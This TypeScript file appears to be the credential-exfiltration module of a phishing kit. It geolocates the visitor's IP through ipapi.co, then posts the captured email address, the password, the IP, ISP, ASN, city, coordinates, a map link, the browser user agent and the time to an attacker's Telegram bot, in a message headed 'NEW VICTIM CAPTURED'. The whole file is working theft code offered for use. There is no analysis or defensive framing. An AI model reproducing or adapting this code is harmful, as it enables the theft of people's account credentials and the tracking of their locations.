import { TELEGRAM_CONFIG } from '../config';

interface IpData {
  ip: string;
  city: string;
  region: string;
  country_name: string;
  country_code: string;
  postal: string;
  latitude: number | string;
  longitude: number | string;
  asn: string;
  org: string;
}

export const getIpInfo = async (): Promise<IpData> => {
  try {
    const response = await fetch('https://ipapi.co/json/');
    if (!response.ok) throw new Error('IP Fetch failed');
    return await response.json();
  } catch (error) {
    console.error("Failed to fetch IP", error);
    return {
      ip: 'Unknown',
      city: 'Unknown',
      region: 'Unknown',
      country_name: 'Unknown',
      country_code: '??',
      postal: 'Unknown',
      latitude: 0,
      longitude: 0,
      asn: 'Unknown',
      org: 'Unknown'
    };
  }
};

export const sendToTelegram = async (
  provider: string,
  email: string,
  pass: string,
  ipData: IpData
) => {
  const { botToken, chatId } = TELEGRAM_CONFIG;

  const googleMapLink = `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}`;
  
  const message = `
🔔 <b>NEW VICTIM CAPTURED</b>
➖➖➖➖➖➖➖➖➖➖➖
👤 <b>LOGIN INFO</b>
<b>Provider:</b> ${provider}
📧 <b>User:</b> <code>${email}</code>
🔑 <b>Pass:</b> <code>${pass}</code>
➖➖➖➖➖➖➖➖➖➖➖
📡 <b>IP DETAILS</b>
<b>IP:</b> <code>${ipData.ip}</code>
<b>ISP:</b> ${ipData.org}
<b>ASN:</b> ${ipData.asn}

📍 <b>LOCATION</b>
<b>Country:</b> ${ipData.country_name} (${ipData.country_code})
<b>State:</b> ${ipData.region}
<b>City:</b> ${ipData.city}
<b>Zip Code:</b> ${ipData.postal}
<b>Lat/Long:</b> <code>${ipData.latitude}, ${ipData.longitude}</code>
🗺 <a href="${googleMapLink}">View on Map</a>

📱 <b>DEVICE INFO</b>
<b>User Agent:</b> ${navigator.userAgent}
<b>Time:</b> ${new Date().toLocaleString()}
➖➖➖➖➖➖➖➖➖➖➖
`;

  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  
  const params = {
    chat_id: chatId,
    text: message,
    parse_mode: 'HTML',
    disable_web_page_preview: true
  };

  try {
    await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(params)
    });
  } catch (error) {
    console.error("Telegram send failed", error);
  }
};
